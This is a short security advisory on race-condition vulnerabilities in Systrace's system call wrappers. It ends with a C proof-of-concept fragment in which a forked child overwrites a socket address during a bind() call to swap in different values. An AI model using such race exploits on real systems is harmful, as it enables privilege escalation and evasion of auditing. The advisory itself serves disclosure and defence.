source: http://www.securityfocus.com/bid/25258/info

Systrace is prone to multiple concurrency vulnerabilities due to its implementation of system call wrappers. This problem can result in a race condition between a user thread and the kernel.

Attackers can exploit these issues by replacing certain values in system call wrappers with malicious data to elevate privileges or to bypass auditing. Successful attacks can completely compromise affected computers. 

struct sockaddr_in *sa, restoresa;
/* Set up two addresses with INADDR_ANY. */
sa = fork_malloc(sizeof(*sa));
sa->sin_len = sizeof(*sa);
sa->sin_family = AF_INET;
sa->sin_addr.s_addr = INADDR_ANY;
sa->sin_port = htons(8888);
restoresa = *sa;
/* Create child to overwrite *sa after 500k cycles. */
pid = fork_and_overwrite_smp_afterwait(sa, &restoresa,
sizeof(restoresa), 500000);
error = bind(sock, sa, sizeof(*sa));